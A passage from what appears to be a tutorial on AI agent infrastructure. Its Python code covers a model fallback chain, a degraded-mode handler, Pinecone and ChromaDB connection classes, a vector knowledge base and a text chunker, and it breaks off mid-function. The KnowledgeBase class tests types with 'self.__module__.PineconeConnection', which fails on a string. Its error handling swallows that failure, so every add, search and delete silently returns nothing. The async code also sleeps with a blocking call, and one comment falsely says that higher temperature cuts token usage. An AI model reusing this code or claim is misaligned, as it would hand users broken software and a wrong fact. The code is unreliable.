                     max_tokens: int = 1000,
                     temperature: float = 0.7) -> Dict[str, Any]:
        """
        Generate a response using the model chain.
        
        Args:
            prompt: Text prompt
            max_tokens: Maximum tokens to generate
            temperature: Temperature for generation
            
        Returns:
            Response with text and metadata
            
        Raises:
            Exception: If all models fail
        """
        import openai
        
        last_exception = None
        for i, config in enumerate(self.model_configs):
            model = config["model"]
            timeout = config.get("timeout", 60)
            retry_count = config.get("retry_count", 1)
            
            logger.info(f"Trying model {i+1}/{len(self.model_configs)}: {model}")
            
            for attempt in range(retry_count):
                try:
                    start_time = time.time()
                    
                    response = await openai.ChatCompletion.acreate(
                        model=model,
                        messages=[{"role": "user", "content": prompt}],
                        max_tokens=max_tokens,
                        temperature=temperature,
                        timeout=timeout
                    )
                    
                    generation_time = time.time() - start_time
                    
                    return {
                        "text": response.choices[0].message.content,
                        "model_used": model,
                        "generation_time": generation_time,
                        "fallback_level": i,
                        "was_fallback": i > 0
                    }
                    
                except Exception as e:
                    last_exception = e
                    logger.warning(f"Model {model} attempt {attempt+1}/{retry_count} failed: {str(e)}")
                    
                    # Add exponential backoff between retries
                    if attempt < retry_count - 1:
                        backoff = (2 ** attempt) * 0.5 * (0.5 + random.random())
                        time.sleep(backoff)
        
        # All models failed
        logger.error("All models in fallback chain failed")
        raise last_exception if last_exception else RuntimeError("All models failed")

class DegradedModeHandler:
    """
    Handler for operating in degraded mode when resources are limited.
    """
    
    NORMAL = "normal"
    DEGRADED = "degraded"
    CRITICAL = "critical"
    
    def __init__(self, degradation_threshold: float = 0.7, critical_threshold: float = 0.9):
        """
        Initialize the degraded mode handler.
        
        Args:
            degradation_threshold: Resource usage threshold for degraded mode
            critical_threshold: Resource usage threshold for critical mode
        """
        self.degradation_threshold = degradation_threshold
        self.critical_threshold = critical_threshold
        self.current_mode = self.NORMAL
        self.resource_usage = 0.0
    
    def update_resource_usage(self, usage: float) -> None:
        """
        Update current resource usage and mode.
        
        Args:
            usage: Current resource usage (0-1)
        """
        self.resource_usage = usage
        
        # Update mode based on resource usage
        if usage >= self.critical_threshold:
            if self.current_mode != self.CRITICAL:
                logger.warning(f"Entering CRITICAL mode (resource usage: {usage:.2f})")
                self.current_mode = self.CRITICAL
        elif usage >= self.degradation_threshold:
            if self.current_mode == self.NORMAL:
                logger.warning(f"Entering DEGRADED mode (resource usage: {usage:.2f})")
                self.current_mode = self.DEGRADED
        else:
            if self.current_mode != self.NORMAL:
                logger.info(f"Returning to NORMAL mode (resource usage: {usage:.2f})")
                self.current_mode = self.NORMAL
    
    def get_agent_config(self, agent_type: str) -> Dict[str, Any]:
        """
        Get configuration for an agent based on current mode.
        
        Args:
            agent_type: Type of agent
            
        Returns:
            Agent configuration
        """
        # Base configuration
        base_config = {
            "max_tokens": 4000,
            "temperature": 0.7,
            "timeout": 60,
            "stream": True
        }
        
        if self.current_mode == self.NORMAL:
            # Normal mode - use best models
            return {
                **base_config,
                "model": "gpt-4-turbo",
                "max_tokens": 4000
            }
        
        elif self.current_mode == self.DEGRADED:
            # Degraded mode - use more efficient models
            return {
                **base_config,
                "model": "gpt-3.5-turbo",
                "max_tokens": 2000,
                "temperature": 0.8  # Higher temp can reduce token usage
            }
        
        else:  # CRITICAL mode
            # Critical mode - most restrictive
            return {
                **base_config,
                "model": "gpt-3.5-turbo",
                "max_tokens": 1000,
                "temperature": 0.9,
                "timeout": 30,
                "stream": False  # Disable streaming to reduce connection overhead
            }
    
    def should_cache_result(self) -> bool:
        """Determine if results should be cached based on current mode."""
        # Always cache in degraded or critical mode
        return self.current_mode != self.NORMAL
    
    def should_use_cached_result(self, similarity: float) -> bool:
        """
        Determine if cached results should be used based on current mode.
        
        Args:
            similarity: Similarity score of cached result (0-1)
            
        Returns:
            True if cached result should be used
        """
        if self.current_mode == self.NORMAL:
            # In normal mode, be stricter about cache matching
            return similarity >= 0.95
        elif self.current_mode == self.DEGRADED:
            # In degraded mode, be more lenient
            return similarity >= 0.85
        else:  # CRITICAL mode
            # In critical mode, use cache aggressively
            return similarity >= 0.7
    
    def get_current_state(self) -> Dict[str, Any]:
        """Get current state of the handler."""
        return {
            "mode": self.current_mode,
            "resource_usage": self.resource_usage,
            "degradation_threshold": self.degradation_threshold,
            "critical_threshold": self.critical_threshold
        }
```

### Using Vector Databases for Fast Knowledge Retrieval

Vector databases are essential for AI agent systems that need to quickly access and retrieve relevant information. Here's how to implement efficient vector database integration:

**1. Setting Up a Vector Database Connection with Improved Error Handling**

```python
# vector_storage/connection.py
import os
import time
import logging
import threading
from typing import Dict, List, Any, Optional, Union, Tuple

logger = logging.getLogger(__name__)

class VectorDBConnection:
    """Base class for vector database connections with connection pooling and retry logic."""
    
    def __init__(self, 
                 api_key: str,
                 environment: Optional[str] = None,
                 max_retries: int = 3,
                 retry_delay: float = 1.0,
                 pool_size: int = 5):
        """
        Initialize the vector database connection.
        
        Args:
            api_key: API key for the vector database
            environment: Optional environment identifier
            max_retries: Maximum number of retries for operations
            retry_delay: Base delay between retries in seconds
            pool_size: Size of the connection pool
        """
        self.api_key = api_key
        self.environment = environment
        self.max_retries = max_retries
        self.retry_delay = retry_delay
        self.pool_size = pool_size
        
        # Connection pool and semaphore for limiting concurrent connections
        self.connection_pool = []
        self.pool_lock = threading.RLock()
        self.pool_semaphore = threading.Semaphore(pool_size)
        
        # Connection status
        self.is_initialized = False
        self.last_error = None
        
        # Metrics
        self.metrics = {
            "queries": 0,
            "successful_queries": 0,
            "failed_queries": 0,
            "retries": 0,
            "avg_query_time": 0,
            "total_query_time": 0
        }
    
    def initialize(self) -> bool:
        """
        Initialize the vector database connection.
        
        Returns:
            True if initialization succeeded, False otherwise
        """
        raise NotImplementedError("Subclasses must implement initialize()")
    
    def create_connection(self) -> Any:
        """
        Create a new connection to the vector database.
        
        Returns:
            Connection object
        """
        raise NotImplementedError("Subclasses must implement create_connection()")
    
    def close_connection(self, connection: Any) -> None:
        """
        Close a connection to the vector database.
        
        Args:
            connection: Connection to close
        """
        raise NotImplementedError("Subclasses must implement close_connection()")
    
    def get_connection(self) -> Any:
        """
        Get a connection from the pool or create a new one.
        
        Returns:
            Connection object
        """
        # Acquire semaphore to limit concurrent connections
        self.pool_semaphore.acquire()
        
        try:
            with self.pool_lock:
                if self.connection_pool:
                    return self.connection_pool.pop()
            
            # No connections in the pool, create a new one
            return self.create_connection()
            
        except Exception as e:
            # Release semaphore on error
            self.pool_semaphore.release()
            raise
    
    def release_connection(self, connection: Any) -> None:
        """
        Release a connection back to the pool.
        
        Args:
            connection: Connection to release
        """
        try:
            with self.pool_lock:
                self.connection_pool.append(connection)
        finally:
            # Always release semaphore
            self.pool_semaphore.release()
    
    def close_all_connections(self) -> None:
        """Close all connections in the pool."""
        with self.pool_lock:
            for connection in self.connection_pool:
                try:
                    self.close_connection(connection)
                except Exception as e:
                    logger.warning(f"Error closing connection: {e}")
            
            self.connection_pool = []
    
    def with_retry(self, operation_func, *args, **kwargs):
        """
        Execute an operation with retry logic.
        
        Args:
            operation_func: Function to execute
            *args, **kwargs: Arguments to pass to the function
            
        Returns:
            Result of the operation
            
        Raises:
            Exception: If all retries fail
        """
        last_exception = None
        
        for attempt in range(self.max_retries):
            try:
                # Measure operation time
                start_time = time.time()
                result = operation_func(*args, **kwargs)
                operation_time = time.time() - start_time
                
                # Update metrics on success
                self.metrics["queries"] += 1
                self.metrics["successful_queries"] += 1
                self.metrics["total_query_time"] += operation_time
                self.metrics["avg_query_time"] = (
                    self.metrics["total_query_time"] / self.metrics["successful_queries"]
                )
                
                return result
                
            except Exception as e:
                last_exception = e
                self.last_error = str(e)
                
                # Update metrics
                self.metrics["retries"] += 1
                
                logger.warning(f"Vector DB operation failed (attempt {attempt+1}/{self.max_retries}): {e}")
                
                # Exponential backoff
                if attempt < self.max_retries - 1:
                    delay = self.retry_delay * (2 ** attempt)
                    time.sleep(delay)
        
        # All retries failed
        self.metrics["queries"] += 1
        self.metrics["failed_queries"] += 1
        
        # Re-raise the last exception
        raise last_exception
    
    def get_metrics(self) -> Dict[str, Any]:
        """
        Get connection metrics.
        
        Returns:
            Dictionary of metrics
        """
        with self.pool_lock:
            metrics = self.metrics.copy()
            metrics["pool_size"] = len(self.connection_pool)
            metrics["is_initialized"] = self.is_initialized
            metrics["last_error"] = self.last_error
            return metrics

class PineconeConnection(VectorDBConnection):
    """Pinecone vector database connection implementation."""
    
    def __init__(self, 
                 api_key: str,
                 environment: str,
                 project_id: Optional[str] = None,
                 **kwargs):
        """
        Initialize Pinecone connection.
        
        Args:
            api_key: Pinecone API key
            environment: Pinecone environment
            project_id: Optional Pinecone project ID
            **kwargs: Additional arguments for VectorDBConnection
        """
        super().__init__(api_key, environment, **kwargs)
        self.project_id = project_id
        self.indexes = {}  # Cache for index connections
    
    def initialize(self) -> bool:
        """
        Initialize the Pinecone client.
        
        Returns:
            True if initialization succeeded
        """
        try:
            import pinecone
            
            # Initialize Pinecone
            pinecone.init(
                api_key=self.api_key,
                environment=self.environment
            )
            
            self.is_initialized = True
            return True
            
        except Exception as e:
            logger.error(f"Failed to initialize Pinecone: {e}")
            self.last_error = str(e)
            self.is_initialized = False
            return False
    
    def create_connection(self) -> Any:
        """
        Create a new connection to Pinecone.
        
        Returns:
            Pinecone client
        """
        import pinecone
        
        if not self.is_initialized:
            self.initialize()
        
        # Pinecone doesn't have a dedicated connection object
        # We'll just return the module for now
        return pinecone
    
    def close_connection(self, connection: Any) -> None:
        """
        Close connection to Pinecone.
        
        Args:
            connection: Pinecone connection
        """
        # Pinecone doesn't require explicit connection closing
        pass
    
    def get_index(self, index_name: str) -> Any:
        """
        Get a Pinecone index.
        
        Args:
            index_name: Name of the index
            
        Returns:
            Pinecone index object
        """
        import pinecone
        
        # Check if index is cached
        if index_name in self.indexes:
            return self.indexes[index_name]
        
        # Get connection
        connection = self.get_connection()
        
        try:
            # Get the index
            index = connection.Index(index_name)
            
            # Cache the index
            self.indexes[index_name] = index
            
            return index
            
        finally:
            # Release connection
            self.release_connection(connection)
    
    def query(self, 
             index_name: str,
             vector: List[float],
             top_k: int = 10,
             include_metadata: bool = True,
             include_values: bool = False,
             namespace: str = "",
             filter: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Query a Pinecone index.
        
        Args:
            index_name: Name of the index
            vector: Query vector
            top_k: Number of results to return
            include_metadata: Whether to include metadata
            include_values: Whether to include vector values
            namespace: Optional namespace
            filter: Optional filter
            
        Returns:
            Query results
        """
        def _do_query():
            index = self.get_index(index_name)
            
            return index.query(
                vector=vector,
                top_k=top_k,
                include_metadata=include_metadata,
                include_values=include_values,
                namespace=namespace,
                filter=filter
            )
        
        return self.with_retry(_do_query)
    
    def upsert(self,
              index_name: str,
              vectors: List[Tuple[str, List[float], Dict[str, Any]]],
              namespace: str = "") -> Dict[str, Any]:
        """
        Upsert vectors to a Pinecone index.
        
        Args:
            index_name: Name of the index
            vectors: List of (id, vector, metadata) tuples
            namespace: Optional namespace
            
        Returns:
            Upsert response
        """
        def _do_upsert():
            index = self.get_index(index_name)
            
            # Format vectors for Pinecone
            formatted_vectors = [
                (id, vector, metadata)
                for id, vector, metadata in vectors
            ]
            
            return index.upsert(
                vectors=formatted_vectors,
                namespace=namespace
            )
        
        return self.with_retry(_do_upsert)
    
    def delete(self,
              index_name: str,
              ids: Optional[List[str]] = None,
              delete_all: bool = False,
              namespace: str = "",
              filter: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Delete vectors from a Pinecone index.
        
        Args:
            index_name: Name of the index
            ids: List of vector IDs to delete
            delete_all: Whether to delete all vectors
            namespace: Optional namespace
            filter: Optional filter
            
        Returns:
            Delete response
        """
        def _do_delete():
            index = self.get_index(index_name)
            
            if delete_all:
                return index.delete(delete_all=True, namespace=namespace)
            elif filter:
                return index.delete(filter=filter, namespace=namespace)
            else:
                return index.delete(ids=ids, namespace=namespace)
        
        return self.with_retry(_do_delete)
    
    def list_indexes(self) -> List[str]:
        """
        List all Pinecone indexes.
        
        Returns:
            List of index names
        """
        def _do_list():
            connection = self.get_connection()
            try:
                return connection.list_indexes()
            finally:
                self.release_connection(connection)
        
        return self.with_retry(_do_list)
    
    def create_index(self,
                    name: str,
                    dimension: int,
                    metric: str = "cosine",
                    pods: int = 1,
                    replicas: int = 1,
                    pod_type: str = "p1.x1") -> bool:
        """
        Create a new Pinecone index.
        
        Args:
            name: Index name
            dimension: Vector dimension
            metric: Distance metric
            pods: Number of pods
            replicas: Number of replicas
            pod_type: Pod type
            
        Returns:
            True if index was created
        """
        def _do_create():
            connection = self.get_connection()
            try:
                connection.create_index(
                    name=name,
                    dimension=dimension,
                    metric=metric,
                    pods=pods,
                    replicas=replicas,
                    pod_type=pod_type
                )
                return True
            finally:
                self.release_connection(connection)
        
        return self.with_retry(_do_create)
    
    def delete_index(self, name: str) -> bool:
        """
        Delete a Pinecone index.
        
        Args:
            name: Index name
            
        Returns:
            True if index was deleted
        """
        def _do_delete():
            connection = self.get_connection()
            try:
                connection.delete_index(name)
                
                # Remove from index cache
                if name in self.indexes:
                    del self.indexes[name]
                
                return True
            finally:
                self.release_connection(connection)
        
        return self.with_retry(_do_delete)

class ChromaDBConnection(VectorDBConnection):
    """ChromaDB vector database connection implementation."""
    
    def __init__(self, 
                 host: Optional[str] = None,
                 port: Optional[int] = None,
                 ssl: bool = False,
                 headers: Optional[Dict[str, str]] = None,
                 persistent_dir: Optional[str] = None,
                 **kwargs):
        """
        Initialize ChromaDB connection.
        
        Args:
            host: ChromaDB host for HTTP client
            port: ChromaDB port for HTTP client
            ssl: Whether to use SSL
            headers: Optional headers for HTTP client
            persistent_dir: Directory for local persistence
            **kwargs: Additional arguments for VectorDBConnection
        """
        # ChromaDB doesn't use API key or environment in the same way
        super().__init__(api_key="", **kwargs)
        
        self.host = host
        self.port = port
        self.ssl = ssl
        self.headers = headers
        self.persistent_dir = persistent_dir
        self.client_type = "http" if host else "persistent"
        
        # Cache for collection connections
        self.collections = {}
    
    def initialize(self) -> bool:
        """
        Initialize the ChromaDB client.
        
        Returns:
            True if initialization succeeded
        """
        try:
            import chromadb
            
            # Initialize connection based on configuration
            if self.client_type == "http":
                self._client_args = {
                    "host": self.host,
                    "port": self.port,
                    "ssl": self.ssl,
                    "headers": self.headers
                }
            else:
                self._client_args = {
                    "path": self.persistent_dir
                }
            
            # Test connection
            client = self.create_connection()
            heartbeat = client.heartbeat()
            
            self.is_initialized = True
            return True
            
        except Exception as e:
            logger.error(f"Failed to initialize ChromaDB: {e}")
            self.last_error = str(e)
            self.is_initialized = False
            return False
    
    def create_connection(self) -> Any:
        """
        Create a new connection to ChromaDB.
        
        Returns:
            ChromaDB client
        """
        import chromadb
        
        if not self.is_initialized:
            self.initialize()
        
        # Create client based on client type
        if self.client_type == "http":
            return chromadb.HttpClient(**self._client_args)
        else:
            return chromadb.PersistentClient(**self._client_args)
    
    def close_connection(self, connection: Any) -> None:
        """
        Close connection to ChromaDB.
        
        Args:
            connection: ChromaDB connection
        """
        # No explicit closing needed for ChromaDB
        pass
    
    def get_collection(self, 
                      name: str, 
                      embedding_function: Optional[Any] = None,
                      create_if_missing: bool = True) -> Any:
        """
        Get a ChromaDB collection.
        
        Args:
            name: Collection name
            embedding_function: Optional embedding function
            create_if_missing: Whether to create collection if it doesn't exist
            
        Returns:
            ChromaDB collection
        """
        # Check if collection is cached
        collection_key = f"{name}_{id(embedding_function)}"
        if collection_key in self.collections:
            return self.collections[collection_key]
        
        # Get connection
        client = self.get_connection()
        
        try:
            # Try to get collection
            try:
                collection = client.get_collection(
                    name=name,
                    embedding_function=embedding_function
                )
            except Exception as e:
                # Collection doesn't exist
                if create_if_missing:
                    collection = client.create_collection(
                        name=name,
                        embedding_function=embedding_function
                    )
                else:
                    raise
            
            # Cache the collection
            self.collections[collection_key] = collection
            
            return collection
            
        finally:
            # Release connection
            self.release_connection(client)
    
    def query(self,
             collection_name: str,
             query_texts: Optional[List[str]] = None,
             query_embeddings: Optional[List[List[float]]] = None,
             n_results: int = 10,
             where: Optional[Dict[str, Any]] = None,
             embedding_function: Optional[Any] = None) -> Dict[str, Any]:
        """
        Query a ChromaDB collection.
        
        Args:
            collection_name: Collection name
            query_texts: Query texts
            query_embeddings: Query embeddings
            n_results: Number of results to return
            where: Optional filter
            embedding_function: Optional embedding function
            
        Returns:
            Query results
        """
        def _do_query():
            collection = self.get_collection(
                collection_name, 
                embedding_function,
                create_if_missing=False
            )
            
            return collection.query(
                query_texts=query_texts,
                query_embeddings=query_embeddings,
                n_results=n_results,
                where=where
            )
        
        return self.with_retry(_do_query)
    
    def add_documents(self,
                     collection_name: str,
                     documents: List[str],
                     metadatas: Optional[List[Dict[str, Any]]] = None,
                     ids: Optional[List[str]] = None,
                     embedding_function: Optional[Any] = None) -> Dict[str, Any]:
        """
        Add documents to a ChromaDB collection.
        
        Args:
            collection_name: Collection name
            documents: Documents to add
            metadatas: Optional metadata for each document
            ids: Optional IDs for each document
            embedding_function: Optional embedding function
            
        Returns:
            Add response
        """
        def _do_add():
            collection = self.get_collection(
                collection_name,
                embedding_function,
                create_if_missing=True
            )
            
            return collection.add(
                documents=documents,
                metadatas=metadatas,
                ids=ids
            )
        
        return self.with_retry(_do_add)
    
    def delete(self,
              collection_name: str,
              ids: Optional[List[str]] = None,
              where: Optional[Dict[str, Any]] = None,
              embedding_function: Optional[Any] = None) -> Dict[str, Any]:
        """
        Delete documents from a ChromaDB collection.
        
        Args:
            collection_name: Collection name
            ids: Optional IDs to delete
            where: Optional filter
            embedding_function: Optional embedding function
            
        Returns:
            Delete response
        """
        def _do_delete():
            collection = self.get_collection(
                collection_name,
                embedding_function,
                create_if_missing=False
            )
            
            return collection.delete(
                ids=ids,
                where=where
            )
        
        return self.with_retry(_do_delete)
    
    def list_collections(self) -> List[str]:
        """
        List all ChromaDB collections.
        
        Returns:
            List of collection names
        """
        def _do_list():
            client = self.get_connection()
            try:
                collections = client.list_collections()
                return [collection.name for collection in collections]
            finally:
                self.release_connection(client)
        
        return self.with_retry(_do_list)
    
    def delete_collection(self, name: str) -> bool:
        """
        Delete a ChromaDB collection.
        
        Args:
            name: Collection name
            
        Returns:
            True if collection was deleted
        """
        def _do_delete():
            client = self.get_connection()
            try:
                client.delete_collection(name)
                
                # Remove from collection cache
                for key in list(self.collections.keys()):
                    if key.startswith(f"{name}_"):
                        del self.collections[key]
                
                return True
            finally:
                self.release_connection(client)
        
        return self.with_retry(_do_delete)
```

**2. Knowledge Base Implementation with Vector Database**

```python
# vector_storage/knowledge_base.py
import os
import json
import time
import hashlib
import logging
from typing import Dict, List, Any, Optional, Union, Tuple
from dataclasses import dataclass, field

from .connection import VectorDBConnection

logger = logging.getLogger(__name__)

@dataclass
class Document:
    """Document for storage in knowledge base."""
    id: str
    content: str
    metadata: Dict[str, Any] = field(default_factory=dict)
    embedding: Optional[List[float]] = None
    score: float = 0.0

class KnowledgeBase:
    """
    Knowledge base for storing and retrieving documents using vector embeddings.
    """
    
    def __init__(self, 
                 vector_db: VectorDBConnection,
                 embedding_function: callable,
                 collection_name: str,
                 dimension: int = 1536):
        """
        Initialize the knowledge base.
        
        Args:
            vector_db: Vector database connection
            embedding_function: Function to convert text to embeddings
            collection_name: Name of the collection/index
            dimension: Dimension of the embeddings
        """
        self.vector_db = vector_db
        self.embedding_function = embedding_function
        self.collection_name = collection_name
        self.dimension = dimension
        
        self.ensure_collection_exists()
    
    def ensure_collection_exists(self) -> bool:
        """
        Ensure the collection/index exists in the vector database.
        
        Returns:
            True if collection exists or was created
        """
        # Implementation depends on specific vector database
        try:
            if isinstance(self.vector_db, self.__module__.PineconeConnection):
                # Check if index exists
                indexes = self.vector_db.list_indexes()
                
                if self.collection_name not in indexes:
                    # Create index
                    self.vector_db.create_index(
                        name=self.collection_name,
                        dimension=self.dimension,
                        metric="cosine"
                    )
                
                return True
                
            elif isinstance(self.vector_db, self.__module__.ChromaDBConnection):
                # ChromaDB will create collection if it doesn't exist
                self.vector_db.get_collection(
                    name=self.collection_name, 
                    embedding_function=self.embedding_function,
                    create_if_missing=True
                )
                
                return True
                
            else:
                logger.warning(f"Unsupported vector database type: {type(self.vector_db)}")
                return False
                
        except Exception as e:
            logger.error(f"Error ensuring collection exists: {e}")
            return False
    
    def get_embedding(self, text: str) -> List[float]:
        """
        Get embedding for text.
        
        Args:
            text: Text to embed
            
        Returns:
            Embedding vector
        """
        try:
            return self.embedding_function(text)
        except Exception as e:
            logger.error(f"Error getting embedding: {e}")
            raise
    
    def add_document(self, document: Document) -> bool:
        """
        Add a document to the knowledge base.
        
        Args:
            document: Document to add
            
        Returns:
            True if document was added successfully
        """
        try:
            # Generate embedding if not provided
            if document.embedding is None:
                document.embedding = self.get_embedding(document.content)
            
            # Add to vector database
            if isinstance(self.vector_db, self.__module__.PineconeConnection):
                self.vector_db.upsert(
                    index_name=self.collection_name,
                    vectors=[(document.id, document.embedding, document.metadata)],
                    namespace=""
                )
                
            elif isinstance(self.vector_db, self.__module__.ChromaDBConnection):
                self.vector_db.add_documents(
                    collection_name=self.collection_name,
                    documents=[document.content],
                    metadatas=[document.metadata],
                    ids=[document.id],
                    embedding_function=None  # Don't use collection's embedding function
                )
                
            else:
                logger.warning(f"Unsupported vector database type: {type(self.vector_db)}")
                return False
            
            return True
            
        except Exception as e:
            logger.error(f"Error adding document: {e}")
            return False
    
    def add_documents(self, documents: List[Document]) -> Tuple[bool, int]:
        """
        Add multiple documents to the knowledge base.
        
        Args:
            documents: Documents to add
            
        Returns:
            Tuple of (success, number of documents added)
        """
        try:
            # Generate embeddings for documents without them
            for doc in documents:
                if doc.embedding is None:
                    doc.embedding = self.get_embedding(doc.content)
            
            # Add to vector database
            if isinstance(self.vector_db, self.__module__.PineconeConnection):
                vectors = [
                    (doc.id, doc.embedding, doc.metadata)
                    for doc in documents
                ]
                
                self.vector_db.upsert(
                    index_name=self.collection_name,
                    vectors=vectors,
                    namespace=""
                )
                
            elif isinstance(self.vector_db, self.__module__.ChromaDBConnection):
                self.vector_db.add_documents(
                    collection_name=self.collection_name,
                    documents=[doc.content for doc in documents],
                    metadatas=[doc.metadata for doc in documents],
                    ids=[doc.id for doc in documents],
                    embedding_function=None
                )
                
            else:
                logger.warning(f"Unsupported vector database type: {type(self.vector_db)}")
                return False, 0
            
            return True, len(documents)
            
        except Exception as e:
            logger.error(f"Error adding documents: {e}")
            return False, 0
    
    def delete_document(self, document_id: str) -> bool:
        """
        Delete a document from the knowledge base.
        
        Args:
            document_id: ID of document to delete
            
        Returns:
            True if document was deleted successfully
        """
        try:
            # Delete from vector database
            if isinstance(self.vector_db, self.__module__.PineconeConnection):
                self.vector_db.delete(
                    index_name=self.collection_name,
                    ids=[document_id],
                    namespace=""
                )
                
            elif isinstance(self.vector_db, self.__module__.ChromaDBConnection):
                self.vector_db.delete(
                    collection_name=self.collection_name,
                    ids=[document_id]
                )
                
            else:
                logger.warning(f"Unsupported vector database type: {type(self.vector_db)}")
                return False
            
            return True
            
        except Exception as e:
            logger.error(f"Error deleting document: {e}")
            return False
    
    def search(self, 
              query: str, 
              top_k: int = 5,
              threshold: float = 0.0,
              filter: Optional[Dict[str, Any]] = None) -> List[Document]:
        """
        Search for documents similar to the query.
        
        Args:
            query: Query string
            top_k: Number of results to return
            threshold: Minimum similarity threshold
            filter: Optional filter for metadata
            
        Returns:
            List of matching documents
        """
        try:
            # Get query embedding
            query_embedding = self.get_embedding(query)
            
            # Search vector database
            if isinstance(self.vector_db, self.__module__.PineconeConnection):
                response = self.vector_db.query(
                    index_name=self.collection_name,
                    vector=query_embedding,
                    top_k=top_k,
                    include_metadata=True,
                    filter=filter
                )
                
                # Convert response to documents
                documents = []
                for match in response.get("matches", []):
                    if match.get("score", 0) >= threshold:
                        doc = Document(
                            id=match.get("id", ""),
                            content=match.get("metadata", {}).get("text", ""),
                            metadata=match.get("metadata", {}),
                            score=match.get("score", 0)
                        )
                        documents.append(doc)
                
                return documents
                
            elif isinstance(self.vector_db, self.__module__.ChromaDBConnection):
                response = self.vector_db.query(
                    collection_name=self.collection_name,
                    query_embeddings=[query_embedding],
                    n_results=top_k,
                    where=filter
                )
                
                # Convert response to documents
                documents = []
                
                ids = response.get("ids", [[]])[0]
                distances = response.get("distances", [[]])[0]
                metadatas = response.get("metadatas", [[]])[0]
                documents_content = response.get("documents", [[]])[0]
                
                for i in range(len(ids)):
                    # Convert distance to similarity score (ChromaDB returns distances)
                    score = 1.0 - distances[i]
                    
                    if score >= threshold:
                        doc = Document(
                            id=ids[i],
                            content=documents_content[i],
                            metadata=metadatas[i] if metadatas else {},
                            score=score
                        )
                        documents.append(doc)
                
                return documents
                
            else:
                logger.warning(f"Unsupported vector database type: {type(self.vector_db)}")
                return []
            
        except Exception as e:
            logger.error(f"Error searching documents: {e}")
            return []
    
    def update_document(self, document: Document) -> bool:
        """
        Update a document in the knowledge base.
        
        Args:
            document: Updated document
            
        Returns:
            True if document was updated successfully
        """
        # For most vector databases, this is the same as adding
        return self.add_document(document)
    
    def get_document_by_id(self, document_id: str) -> Optional[Document]:
        """
        Get a document by ID.
        
        Args:
            document_id: Document ID
            
        Returns:
            Document if found, None otherwise
        """
        try:
            # Implementation depends on specific vector database
            if isinstance(self.vector_db, self.__module__.PineconeConnection):
                # Not directly supported by Pinecone API, but we can fetch the vector
                # and metadata for a specific ID
                # This would require direct access to the specific index
                index = self.vector_db.get_index(self.collection_name)
                response = index.fetch(ids=[document_id])
                
                if document_id in response.get("vectors", {}):
                    vector_data = response["vectors"][document_id]
                    
                    return Document(
                        id=document_id,
                        content=vector_data.get("metadata", {}).get("text", ""),
                        metadata=vector_data.get("metadata", {}),
                        embedding=vector_data.get("values"),
                        score=1.0  # Not a search result, so score not applicable
                    )
                
                return None
                
            elif isinstance(self.vector_db, self.__module__.ChromaDBConnection):
                # Get collection
                collection = self.vector_db.get_collection(
                    name=self.collection_name,
                    embedding_function=self.embedding_function,
                    create_if_missing=False
                )
                
                # Get document by ID
                response = collection.get(ids=[document_id])
                
                if response.get("ids") and len(response["ids"]) > 0:
                    return Document(
                        id=response["ids"][0],
                        content=response.get("documents", [""])[0],
                        metadata=response.get("metadatas", [{}])[0] if response.get("metadatas") else {},
                        embedding=response.get("embeddings", [None])[0] if response.get("embeddings") else None,
                        score=1.0  # Not a search result
                    )
                
                return None
                
            else:
                logger.warning(f"Unsupported vector database type: {type(self.vector_db)}")
                return None
            
        except Exception as e:
            logger.error(f"Error getting document by ID: {e}")
            return None
```

**3. Text Chunking and Processing for Knowledge Base**

```python
# vector_storage/text_processing.py
import re
import hashlib
import logging
from typing import List, Dict, Any, Optional, Tuple

logger = logging.getLogger(__name__)

class TextChunker:
    """
    Splits text into chunks for storage in a vector database.
    """
    
    def __init__(self, 
                 chunk_size: int = 1000,
                 chunk_overlap: int = 200,
                 tokenizer: Optional[callable] = None):
        """
        Initialize the text chunker.
        
        Args:
            chunk_size: Target size of chunks in characters
            chunk_overlap: Overlap between chunks in characters
            tokenizer: Optional tokenizer function
        """
        self.chunk_size = chunk_size
        self.chunk_overlap = chunk_overlap
        self.tokenizer = tokenizer or self._default_tokenizer
    
    def _default_tokenizer(self, text: str) -> List[str]:
        """
        Simple whitespace tokenizer.
        
        Args:
            text: Text to tokenize
            
        Returns:
            List of tokens
        """
        return text.split()
    
    def split_text(self, text: str) -> List[str]:
        """
        Split text into chunks.
        
        Args:
            text: Text to split
            
        Returns:
            List of text chunks
        """
        # Basic preprocessing
        text = text.strip()
        
        # Check if text is short enough for a single chunk
        if len(text) <= self.chunk_size:
            return [text]
        
        chunks = []
        start = 0
        
        while start < len(text):
            # Calculate end position
            end = start + self.chunk_size
            
            # Adjust if we're not at the end of the text
            if end < len(text):
                # Try to find a sentence boundary
                sentence_end = self._find_sentence_boundary(text, end)
                if sentence_end != -1:
                    end = sentence_end
                else:
                    # Try to find a word boundary
                    word_end = self._find_word_boundary(text, end)
                    if word_end != -1:
                        end = word_end
            else:
                end = len(text)
            
            # Add the chunk
            chunks.append(text[start:end])
            
            # Calculate next start position
            start = end - self.chunk_overlap
            
            # Ensure progress
            if start >= end:
                start = end
            
            # If we're at the end, stop
            if start >= len(text):
                break
        
        return chunks
    
    def _find_sentence_boundary(self, text: str, position: int) -> int:
        """
        Find the nearest sentence boundary before the position.
        
        Args:
            text: Text to search
            position: Position to search from
            
        Returns:
            Position of sentence boundary, or -1 if not found
        """
        sentence_end_pattern = r'[.!?]\s+'
        
        # Search for sentence boundaries in a window before the position
        search_start = max(0, position - 100)
        search_text = text[search_start:position]
        
        matches = list(re.finditer(sentence_end_pattern, search_text))
        if matches:
            last_match = matches[-1]
            return search_start + last_match.end()
        
        return -1
    
    def _find_word_boundary(self, text: str, position: int) -> int:
        """
        Find the nearest word boundary before the position.
        
        Args:
            text: Text to search
            position: Position to search from
            
        Returns:
            Position of word boundary, or -1 if not found
        """
        # Search for space characters in a window before the position
        search_start = max(0, position - 50)
        search_text = text[search_start:position]
        
        matches = list(re.finditer(r'\s+', search_text))
        if matches:
            last_match = matches[-1]
            return search_start + last_match.end()
        
        return -1
    
    def get_text_chunks_with_metadata(self, 
                                     text: str, 
                                     metadata: Dict[str, Any],
                                     document_id: Optional[str] = None) -> List[Tuple[str, Dict[str, Any], str]]:
        """
        Split text into chunks and prepare for vector database storage.
        
        Args:
            text: Text to split
            metadata: Base metadata for the document
            document_id: Optional document ID prefix
            
        Returns:
            List of (chunk, metadata, id) tuples
        """
        chunks = self.split_text(text)
        results = []
        
        for i, chunk in enumerate(chunks):
            # Create chunk ID
            if document_id:
                chunk_id = f"{document_id}_chunk_{i}"
            else:
                # Create a hash-based ID if none provided
